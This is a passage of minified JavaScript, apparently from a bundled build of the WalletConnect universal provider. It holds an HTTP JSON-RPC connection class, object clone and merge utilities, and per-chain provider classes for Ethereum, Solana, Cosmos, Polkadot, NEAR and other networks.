mn.EventEmitter,this.isAvailable=!1,this.registering=!1,!n5(e))throw new Error(`Provided URL is not compatible with HTTP connection: ${e}`);this.url=e,this.disableProviderPing=r}get connected(){return this.isAvailable}get connecting(){return this.registering}on(e,r){this.events.on(e,r)}once(e,r){this.events.once(e,r)}off(e,r){this.events.off(e,r)}removeListener(e,r){this.events.removeListener(e,r)}async open(e=this.url){await this.register(e)}async close(){if(!this.isAvailable)throw new Error("Connection already closed");this.onClose()}async send(e){this.isAvailable||await this.register();try{const r=js(e),n=await(await B5(this.url,F5(M5({},z5),{body:r}))).json();this.onPayload({data:n})}catch(r){this.onError(e.id,r)}}async register(e=this.url){if(!n5(e))throw new Error(`Provided URL is not compatible with HTTP connection: ${e}`);if(this.registering){const r=this.events.getMaxListeners();return(this.events.listenerCount("register_error")>=r||this.events.listenerCount("open")>=r)&&this.events.setMaxListeners(r+1),new Promise((n,i)=>{this.events.once("register_error",s=>{this.resetMaxListeners(),i(s)}),this.events.once("open",()=>{if(this.resetMaxListeners(),typeof this.isAvailable>"u")return i(new Error("HTTP connection is missing or invalid"));n()})})}this.url=e,this.registering=!0;try{if(!this.disableProviderPing){const r=js({id:1,jsonrpc:"2.0",method:"test",params:[]});await B5(e,F5(M5({},z5),{body:r}))}this.onOpen()}catch(r){const n=this.parseError(r);throw this.events.emit("register_error",n),this.onClose(),n}}onOpen(){this.isAvailable=!0,this.registering=!1,this.events.emit("open")}onClose(){this.isAvailable=!1,this.registering=!1,this.events.emit("close")}onPayload(e){if(typeof e.data>"u")return;const r=typeof e.data=="string"?yc(e.data):e.data;this.events.emit("payload",r)}onError(e,r){const n=this.parseError(r),i=n.message||n.toString(),s=Qg(e,i);this.events.emit("payload",s)}parseError(e,r=this.url){return BC(e,r,"HTTP")}resetMaxListeners(){this.events.getMaxListeners()>j5&&this.events.setMaxListeners(j5)}};const H5="error",dF="wss://relay.walletconnect.org",fF="wc",pF="universal_provider",Ip=`${fF}@2:${pF}:`,sA="https://rpc.walletconnect.org/v1/",El="generic",gF=`${sA}bundler`,Hn={DEFAULT_CHAIN_CHANGED:"default_chain_changed"};function wF(){}function Xb(t){return t==null||typeof t!="object"&&typeof t!="function"}function e2(t){return ArrayBuffer.isView(t)&&!(t instanceof DataView)}function mF(t){if(Xb(t))return t;if(Array.isArray(t)||e2(t)||t instanceof ArrayBuffer||typeof SharedArrayBuffer<"u"&&t instanceof SharedArrayBuffer)return t.slice(0);const e=Object.getPrototypeOf(t),r=e.constructor;if(t instanceof Date||t instanceof Map||t instanceof Set)return new r(t);if(t instanceof RegExp){const n=new r(t);return n.lastIndex=t.lastIndex,n}if(t instanceof DataView)return new r(t.buffer.slice(0));if(t instanceof Error){const n=new r(t.message);return n.stack=t.stack,n.name=t.name,n.cause=t.cause,n}if(typeof File<"u"&&t instanceof File)return new r([t],t.name,{type:t.type,lastModified:t.lastModified});if(typeof t=="object"){const n=Object.create(e);return Object.assign(n,t)}return t}function q5(t){return typeof t=="object"&&t!==null}function oA(t){return Object.getOwnPropertySymbols(t).filter(e=>Object.prototype.propertyIsEnumerable.call(t,e))}function aA(t){return t==null?t===void 0?"[object Undefined]":"[object Null]":Object.prototype.toString.call(t)}const yF="[object RegExp]",cA="[object String]",lA="[object Number]",uA="[object Boolean]",hA="[object Arguments]",bF="[object Symbol]",vF="[object Date]",EF="[object Map]",CF="[object Set]",AF="[object Array]",xF="[object ArrayBuffer]",IF="[object Object]",SF="[object DataView]",NF="[object Uint8Array]",PF="[object Uint8ClampedArray]",kF="[object Uint16Array]",OF="[object Uint32Array]",_F="[object Int8Array]",TF="[object Int16Array]",$F="[object Int32Array]",RF="[object Float32Array]",DF="[object Float64Array]";function BF(t,e){return Dl(t,void 0,t,new Map,e)}function Dl(t,e,r,n=new Map,i=void 0){const s=i==null?void 0:i(t,e,r,n);if(s!=null)return s;if(Xb(t))return t;if(n.has(t))return n.get(t);if(Array.isArray(t)){const o=new Array(t.length);n.set(t,o);for(let a=0;a<t.length;a++)o[a]=Dl(t[a],a,r,n,i);return Object.hasOwn(t,"index")&&(o.index=t.index),Object.hasOwn(t,"input")&&(o.input=t.input),o}if(t instanceof Date)return new Date(t.getTime());if(t instanceof RegExp){const o=new RegExp(t.source,t.flags);return o.lastIndex=t.lastIndex,o}if(t instanceof Map){const o=new Map;n.set(t,o);for(const[a,c]of t)o.set(a,Dl(c,a,r,n,i));return o}if(t instanceof Set){const o=new Set;n.set(t,o);for(const a of t)o.add(Dl(a,void 0,r,n,i));return o}if(typeof Buffer<"u"&&Buffer.isBuffer(t))return t.subarray();if(e2(t)){const o=new(Object.getPrototypeOf(t)).constructor(t.length);n.set(t,o);for(let a=0;a<t.length;a++)o[a]=Dl(t[a],a,r,n,i);return o}if(t instanceof ArrayBuffer||typeof SharedArrayBuffer<"u"&&t instanceof SharedArrayBuffer)return t.slice(0);if(t instanceof DataView){const o=new DataView(t.buffer.slice(0),t.byteOffset,t.byteLength);return n.set(t,o),Ia(o,t,r,n,i),o}if(typeof File<"u"&&t instanceof File){const o=new File([t],t.name,{type:t.type});return n.set(t,o),Ia(o,t,r,n,i),o}if(t instanceof Blob){const o=new Blob([t],{type:t.type});return n.set(t,o),Ia(o,t,r,n,i),o}if(t instanceof Error){const o=new t.constructor;return n.set(t,o),o.message=t.message,o.name=t.name,o.stack=t.stack,o.cause=t.cause,Ia(o,t,r,n,i),o}if(typeof t=="object"&&LF(t)){const o=Object.create(Object.getPrototypeOf(t));return n.set(t,o),Ia(o,t,r,n,i),o}return t}function Ia(t,e,r=t,n,i){const s=[...Object.keys(e),...oA(e)];for(let o=0;o<s.length;o++){const a=s[o],c=Object.getOwnPropertyDescriptor(t,a);(c==null||c.writable)&&(t[a]=Dl(e[a],a,r,n,i))}}function LF(t){switch(aA(t)){case hA:case AF:case xF:case SF:case uA:case vF:case RF:case DF:case _F:case TF:case $F:case EF:case lA:case IF:case yF:case CF:case cA:case bF:case NF:case PF:case kF:case OF:return!0;default:return!1}}function UF(t,e){return BF(t,(r,n,i,s)=>{if(typeof t=="object")switch(Object.prototype.toString.call(t)){case lA:case cA:case uA:{const o=new t.constructor(t==null?void 0:t.valueOf());return Ia(o,t),o}case hA:{const o={};return Ia(o,t),o.length=t.length,o[Symbol.iterator]=t[Symbol.iterator],o}default:return}})}function V5(t){return UF(t)}function W5(t){return t!==null&&typeof t=="object"&&aA(t)==="[object Arguments]"}function MF(t){return e2(t)}function FF(t){var r;if(typeof t!="object"||t==null)return!1;if(Object.getPrototypeOf(t)===null)return!0;if(Object.prototype.toString.call(t)!=="[object Object]"){const n=t[Symbol.toStringTag];return n==null||!((r=Object.getOwnPropertyDescriptor(t,Symbol.toStringTag))!=null&&r.writable)?!1:t.toString()===`[object ${n}]`}let e=t;for(;Object.getPrototypeOf(e)!==null;)e=Object.getPrototypeOf(e);return Object.getPrototypeOf(t)===e}function zF(t,...e){const r=e.slice(0,-1),n=e[e.length-1];let i=t;for(let s=0;s<r.length;s++){const o=r[s];i=vy(i,o,n,new Map)}return i}function vy(t,e,r,n){if(Xb(t)&&(t=Object(t)),e==null||typeof e!="object")return t;if(n.has(e))return mF(n.get(e));if(n.set(e,t),Array.isArray(e)){e=e.slice();for(let s=0;s<e.length;s++)e[s]=e[s]??void 0}const i=[...Object.keys(e),...oA(e)];for(let s=0;s<i.length;s++){const o=i[s];let a=e[o],c=t[o];if(W5(a)&&(a={...a}),W5(c)&&(c={...c}),typeof Buffer<"u"&&Buffer.isBuffer(a)&&(a=V5(a)),Array.isArray(a))if(typeof c=="object"&&c!=null){const u=[],h=Reflect.ownKeys(c);for(let d=0;d<h.length;d++){const f=h[d];u[f]=c[f]}c=u}else c=[];const l=r(c,a,o,t,e,n);l!=null?t[o]=l:Array.isArray(a)||q5(c)&&q5(a)?t[o]=vy(c,a,r,n):c==null&&FF(a)?t[o]=vy({},a,r,n):c==null&&MF(a)?t[o]=V5(a):(c===void 0||a!==void 0)&&(t[o]=a)}return t}function jF(t,...e){return zF(t,...e,wF)}var HF=Object.defineProperty,qF=Object.defineProperties,VF=Object.getOwnPropertyDescriptors,G5=Object.getOwnPropertySymbols,WF=Object.prototype.hasOwnProperty,GF=Object.prototype.propertyIsEnumerable,K5=(t,e,r)=>e in t?HF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Sp=(t,e)=>{for(var r in e||(e={}))WF.call(e,r)&&K5(t,r,e[r]);if(G5)for(var r of G5(e))GF.call(e,r)&&K5(t,r,e[r]);return t},KF=(t,e)=>qF(t,VF(e));function wn(t,e,r){var n;const i=Hl(t);return((n=e.rpcMap)==null?void 0:n[i.reference])||`${sA}?chainId=${i.namespace}:${i.reference}&projectId=${r}`}function Mc(t){return t.includes(":")?t.split(":")[1]:t}function dA(t){return t.map(e=>`${e.split(":")[0]}:${e.split(":")[1]}`)}function ZF(t,e){const r=Object.keys(e.namespaces).filter(i=>i.includes(t));if(!r.length)return[];const n=[];return r.forEach(i=>{const s=e.namespaces[i].accounts;n.push(...s)}),n}function yw(t={},e={}){const r=Z5(t),n=Z5(e);return jF(r,n)}function Z5(t){var e,r,n,i;const s={};if(!Md(t))return s;for(const[o,a]of Object.entries(t)){const c=Gb(o)?[o]:a.chains,l=a.methods||[],u=a.events||[],h=a.rpcMap||{},d=ad(o);s[d]=KF(Sp(Sp({},s[d]),a),{chains:k0(c,(e=s[d])==null?void 0:e.chains),methods:k0(l,(r=s[d])==null?void 0:r.methods),events:k0(u,(n=s[d])==null?void 0:n.events),rpcMap:Sp(Sp({},h),(i=s[d])==null?void 0:i.rpcMap)})}return s}function J5(t){return t.includes(":")?t.split(":")[2]:t}function Q5(t){const e={};for(const[r,n]of Object.entries(t)){const i=n.methods||[],s=n.events||[],o=n.accounts||[],a=Gb(r)?[r]:n.chains?n.chains:dA(n.accounts);e[r]={chains:a,methods:i,events:s,accounts:o}}return e}function bw(t){return typeof t=="number"?t:t.includes("0x")?parseInt(t,16):(t=t.includes(":")?t.split(":")[1]:t,isNaN(Number(t))?t:Number(t))}const fA={},Ze=t=>fA[t],vw=(t,e)=>{fA[t]=e};var JF=Object.defineProperty,QF=(t,e,r)=>e in t?JF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Kc=(t,e,r)=>QF(t,typeof e!="symbol"?e+"":e,r);let YF=class{constructor(e){Kc(this,"name","polkadot"),Kc(this,"client"),Kc(this,"httpProviders"),Kc(this,"events"),Kc(this,"namespace"),Kc(this,"chainId"),this.namespace=e.namespace,this.events=Ze("events"),this.client=Ze("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,r){this.httpProviders[e]||this.setHttpProvider(e,r),this.chainId=e,this.events.emit(Hn.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getAccounts(){const e=this.namespace.accounts;return e?e.filter(r=>r.split(":")[1]===this.chainId.toString()).map(r=>r.split(":")[2])||[]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(r=>{var n;const i=Mc(r);e[i]=this.createHttpProvider(i,(n=this.namespace.rpcMap)==null?void 0:n[r])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,r=this.httpProviders[e];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}setHttpProvider(e,r){const n=this.createHttpProvider(e,r);n&&(this.httpProviders[e]=n)}createHttpProvider(e,r){const n=r||wn(e,this.namespace,this.client.core.projectId);if(!n)throw new Error(`No RPC url provided for chainId: ${e}`);return new jn(new gi(n,Ze("disableProviderPing")))}};var XF=Object.defineProperty,ez=Object.defineProperties,tz=Object.getOwnPropertyDescriptors,Y5=Object.getOwnPropertySymbols,rz=Object.prototype.hasOwnProperty,nz=Object.prototype.propertyIsEnumerable,Ey=(t,e,r)=>e in t?XF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,X5=(t,e)=>{for(var r in e||(e={}))rz.call(e,r)&&Ey(t,r,e[r]);if(Y5)for(var r of Y5(e))nz.call(e,r)&&Ey(t,r,e[r]);return t},e4=(t,e)=>ez(t,tz(e)),Zc=(t,e,r)=>Ey(t,typeof e!="symbol"?e+"":e,r);let iz=class{constructor(e){Zc(this,"name","eip155"),Zc(this,"client"),Zc(this,"chainId"),Zc(this,"namespace"),Zc(this,"httpProviders"),Zc(this,"events"),this.namespace=e.namespace,this.events=Ze("events"),this.client=Ze("client"),this.httpProviders=this.createHttpProviders(),this.chainId=parseInt(this.getDefaultChain())}async request(e){switch(e.request.method){case"eth_requestAccounts":return this.getAccounts();case"eth_accounts":return this.getAccounts();case"wallet_switchEthereumChain":return await this.handleSwitchChain(e);case"eth_chainId":return parseInt(this.getDefaultChain());case"wallet_getCapabilities":return await this.getCapabilities(e);case"wallet_getCallsStatus":return await this.getCallStatus(e)}return this.namespace.methods.includes(e.request.method)?await this.client.request(e):this.getHttpProvider().request(e.request)}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}setDefaultChain(e,r){this.httpProviders[e]||this.setHttpProvider(parseInt(e),r),this.chainId=parseInt(e),this.events.emit(Hn.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId.toString();if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}createHttpProvider(e,r){const n=r||wn(`${this.name}:${e}`,this.namespace,this.client.core.projectId);if(!n)throw new Error(`No RPC url provided for chainId: ${e}`);return new jn(new gi(n,Ze("disableProviderPing")))}setHttpProvider(e,r){const n=this.createHttpProvider(e,r);n&&(this.httpProviders[e]=n)}createHttpProviders(){const e={};return this.namespace.chains.forEach(r=>{var n;const i=parseInt(Mc(r));e[i]=this.createHttpProvider(i,(n=this.namespace.rpcMap)==null?void 0:n[r])}),e}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(r=>r.split(":")[1]===this.chainId.toString()).map(r=>r.split(":")[2]))]:[]}getHttpProvider(){const e=this.chainId,r=this.httpProviders[e];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}async handleSwitchChain(e){var r,n;let i=e.request.params?(r=e.request.params[0])==null?void 0:r.chainId:"0x0";i=i.startsWith("0x")?i:`0x${i}`;const s=parseInt(i,16);if(this.isChainApproved(s))this.setDefaultChain(`${s}`);else if(this.namespace.methods.includes("wallet_switchEthereumChain"))await this.client.request({topic:e.topic,request:{method:e.request.method,params:[{chainId:i}]},chainId:(n=this.namespace.chains)==null?void 0:n[0]}),this.setDefaultChain(`${s}`);else throw new Error(`Failed to switch to chain 'eip155:${s}'. The chain is not approved or the wallet does not support 'wallet_switchEthereumChain' method.`);return null}isChainApproved(e){return this.namespace.chains.includes(`${this.name}:${e}`)}async getCapabilities(e){var r,n,i;const s=(n=(r=e.request)==null?void 0:r.params)==null?void 0:n[0];if(!s)throw new Error("Missing address parameter in `wallet_getCapabilities` request");const o=this.client.session.get(e.topic),a=((i=o==null?void 0:o.sessionProperties)==null?void 0:i.capabilities)||{};if(a!=null&&a[s])return a==null?void 0:a[s];const c=await this.client.request(e);try{await this.client.session.update(e.topic,{sessionProperties:e4(X5({},o.sessionProperties||{}),{capabilities:e4(X5({},a||{}),{[s]:c})})})}catch(l){console.warn("Failed to update session with capabilities",l)}return c}async getCallStatus(e){var r,n;const i=this.client.session.get(e.topic),s=(r=i.sessionProperties)==null?void 0:r.bundler_name;if(s){const a=this.getBundlerUrl(e.chainId,s);try{return await this.getUserOperationReceipt(a,e)}catch(c){console.warn("Failed to fetch call status from bundler",c,a)}}const o=(n=i.sessionProperties)==null?void 0:n.bundler_url;if(o)try{return await this.getUserOperationReceipt(o,e)}catch(a){console.warn("Failed to fetch call status from custom bundler",a,o)}if(this.namespace.methods.includes(e.request.method))return await this.client.request(e);throw new Error("Fetching call status not approved by the wallet.")}async getUserOperationReceipt(e,r){var n;const i=new URL(e),s=await fetch(i,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify($o("eth_getUserOperationReceipt",[(n=r.request.params)==null?void 0:n[0]]))});if(!s.ok)throw new Error(`Failed to fetch user operation receipt - ${s.status}`);return await s.json()}getBundlerUrl(e,r){return`${gF}?projectId=${this.client.core.projectId}&chainId=${e}&bundler=${r}`}};var sz=Object.defineProperty,oz=(t,e,r)=>e in t?sz(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Jc=(t,e,r)=>oz(t,typeof e!="symbol"?e+"":e,r);let az=class{constructor(e){Jc(this,"name","solana"),Jc(this,"client"),Jc(this,"httpProviders"),Jc(this,"events"),Jc(this,"namespace"),Jc(this,"chainId"),this.namespace=e.namespace,this.events=Ze("events"),this.client=Ze("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,r){this.httpProviders[e]||this.setHttpProvider(e,r),this.chainId=e,this.events.emit(Hn.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(r=>r.split(":")[1]===this.chainId.toString()).map(r=>r.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(r=>{var n;const i=Mc(r);e[i]=this.createHttpProvider(i,(n=this.namespace.rpcMap)==null?void 0:n[r])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,r=this.httpProviders[e];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}setHttpProvider(e,r){const n=this.createHttpProvider(e,r);n&&(this.httpProviders[e]=n)}createHttpProvider(e,r){const n=r||wn(e,this.namespace,this.client.core.projectId);if(!n)throw new Error(`No RPC url provided for chainId: ${e}`);return new jn(new gi(n,Ze("disableProviderPing")))}};var cz=Object.defineProperty,lz=(t,e,r)=>e in t?cz(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Qc=(t,e,r)=>lz(t,typeof e!="symbol"?e+"":e,r);let uz=class{constructor(e){Qc(this,"name","cosmos"),Qc(this,"client"),Qc(this,"httpProviders"),Qc(this,"events"),Qc(this,"namespace"),Qc(this,"chainId"),this.namespace=e.namespace,this.events=Ze("events"),this.client=Ze("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,r){this.httpProviders[e]||this.setHttpProvider(e,r),this.chainId=e,this.events.emit(Hn.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(r=>r.split(":")[1]===this.chainId.toString()).map(r=>r.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(r=>{var n;const i=Mc(r);e[i]=this.createHttpProvider(i,(n=this.namespace.rpcMap)==null?void 0:n[r])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,r=this.httpProviders[e];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}setHttpProvider(e,r){const n=this.createHttpProvider(e,r);n&&(this.httpProviders[e]=n)}createHttpProvider(e,r){const n=r||wn(e,this.namespace,this.client.core.projectId);if(!n)throw new Error(`No RPC url provided for chainId: ${e}`);return new jn(new gi(n,Ze("disableProviderPing")))}};var hz=Object.defineProperty,dz=(t,e,r)=>e in t?hz(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Yc=(t,e,r)=>dz(t,typeof e!="symbol"?e+"":e,r);let fz=class{constructor(e){Yc(this,"name","algorand"),Yc(this,"client"),Yc(this,"httpProviders"),Yc(this,"events"),Yc(this,"namespace"),Yc(this,"chainId"),this.namespace=e.namespace,this.events=Ze("events"),this.client=Ze("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,r){if(!this.httpProviders[e]){const n=r||wn(`${this.name}:${e}`,this.namespace,this.client.core.projectId);if(!n)throw new Error(`No RPC url provided for chainId: ${e}`);this.setHttpProvider(e,n)}this.chainId=e,this.events.emit(Hn.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(r=>r.split(":")[1]===this.chainId.toString()).map(r=>r.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(r=>{var n;e[r]=this.createHttpProvider(r,(n=this.namespace.rpcMap)==null?void 0:n[r])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,r=this.httpProviders[e];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}setHttpProvider(e,r){const n=this.createHttpProvider(e,r);n&&(this.httpProviders[e]=n)}createHttpProvider(e,r){const n=r||wn(e,this.namespace,this.client.core.projectId);return typeof n>"u"?void 0:new jn(new gi(n,Ze("disableProviderPing")))}};var pz=Object.defineProperty,gz=(t,e,r)=>e in t?pz(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Xc=(t,e,r)=>gz(t,typeof e!="symbol"?e+"":e,r);class wz{constructor(e){Xc(this,"name","cip34"),Xc(this,"client"),Xc(this,"httpProviders"),Xc(this,"events"),Xc(this,"namespace"),Xc(this,"chainId"),this.namespace=e.namespace,this.events=Ze("events"),this.client=Ze("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,r){this.httpProviders[e]||this.setHttpProvider(e,r),this.chainId=e,this.events.emit(Hn.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(r=>r.split(":")[1]===this.chainId.toString()).map(r=>r.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(r=>{const n=this.getCardanoRPCUrl(r),i=Mc(r);e[i]=this.createHttpProvider(i,n)}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,r=this.httpProviders[e];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}getCardanoRPCUrl(e){const r=this.namespace.rpcMap;if(r)return r[e]}setHttpProvider(e,r){const n=this.createHttpProvider(e,r);n&&(this.httpProviders[e]=n)}createHttpProvider(e,r){const n=r||this.getCardanoRPCUrl(e);if(!n)throw new Error(`No RPC url provided for chainId: ${e}`);return new jn(new gi(n,Ze("disableProviderPing")))}}var mz=Object.defineProperty,yz=(t,e,r)=>e in t?mz(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,el=(t,e,r)=>yz(t,typeof e!="symbol"?e+"":e,r);class bz{constructor(e){el(this,"name","elrond"),el(this,"client"),el(this,"httpProviders"),el(this,"events"),el(this,"namespace"),el(this,"chainId"),this.namespace=e.namespace,this.events=Ze("events"),this.client=Ze("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,r){this.httpProviders[e]||this.setHttpProvider(e,r),this.chainId=e,this.events.emit(Hn.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(r=>r.split(":")[1]===this.chainId.toString()).map(r=>r.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(r=>{var n;const i=Mc(r);e[i]=this.createHttpProvider(i,(n=this.namespace.rpcMap)==null?void 0:n[r])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,r=this.httpProviders[e];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}setHttpProvider(e,r){const n=this.createHttpProvider(e,r);n&&(this.httpProviders[e]=n)}createHttpProvider(e,r){const n=r||wn(e,this.namespace,this.client.core.projectId);if(!n)throw new Error(`No RPC url provided for chainId: ${e}`);return new jn(new gi(n,Ze("disableProviderPing")))}}var vz=Object.defineProperty,Ez=(t,e,r)=>e in t?vz(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,tl=(t,e,r)=>Ez(t,typeof e!="symbol"?e+"":e,r);let Cz=class{constructor(e){tl(this,"name","multiversx"),tl(this,"client"),tl(this,"httpProviders"),tl(this,"events"),tl(this,"namespace"),tl(this,"chainId"),this.namespace=e.namespace,this.events=Ze("events"),this.client=Ze("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,r){this.httpProviders[e]||this.setHttpProvider(e,r),this.chainId=e,this.events.emit(Hn.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(r=>r.split(":")[1]===this.chainId.toString()).map(r=>r.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(r=>{var n;const i=Mc(r);e[i]=this.createHttpProvider(i,(n=this.namespace.rpcMap)==null?void 0:n[r])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,r=this.httpProviders[e];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}setHttpProvider(e,r){const n=this.createHttpProvider(e,r);n&&(this.httpProviders[e]=n)}createHttpProvider(e,r){const n=r||wn(e,this.namespace,this.client.core.projectId);if(!n)throw new Error(`No RPC url provided for chainId: ${e}`);return new jn(new gi(n,Ze("disableProviderPing")))}};var Az=Object.defineProperty,xz=(t,e,r)=>e in t?Az(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,rl=(t,e,r)=>xz(t,typeof e!="symbol"?e+"":e,r);let Iz=class{constructor(e){rl(this,"name","near"),rl(this,"client"),rl(this,"httpProviders"),rl(this,"events"),rl(this,"namespace"),rl(this,"chainId"),this.namespace=e.namespace,this.events=Ze("events"),this.client=Ze("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,r){if(this.chainId=e,!this.httpProviders[e]){const n=r||wn(`${this.name}:${e}`,this.namespace);if(!n)throw new Error(`No RPC url provided for chainId: ${e}`);this.setHttpProvider(e,n)}this.events.emit(Hn.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?e.filter(r=>r.split(":")[1]===this.chainId.toString()).map(r=>r.split(":")[2])||[]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(r=>{var n;e[r]=this.createHttpProvider(r,(n=this.namespace.rpcMap)==null?void 0:n[r])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,r=this.httpProviders[e];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}setHttpProvider(e,r){const n=this.createHttpProvider(e,r);n&&(this.httpProviders[e]=n)}createHttpProvider(e,r){const n=r||wn(e,this.namespace);return typeof n>"u"?void 0:new jn(new gi(n,Ze("disableProviderPing")))}};var 